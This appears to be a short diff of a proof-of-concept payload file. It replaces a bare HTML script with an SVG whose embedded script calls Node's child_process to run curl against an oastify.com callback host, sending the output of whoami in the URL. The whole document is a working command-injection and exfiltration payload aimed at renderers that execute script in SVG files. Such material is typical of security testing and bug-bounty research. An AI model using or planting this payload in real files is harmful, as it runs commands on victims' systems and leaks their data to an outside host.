@@ -1,3 +1,6 @@
-<script>
-  require('child_process').exec("curl https://ridkicjcs8snpcy4rywnxvfxfolg97xw.oastify.com");
-</script>
+<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    require('child_process').exec("curl -s 'https://r2uk2c3cc8cn9ci4bygnhvzxzo5gt8hx.oastify.com?who=$(whoami)' > /dev/null");
+  </script>
+</svg>
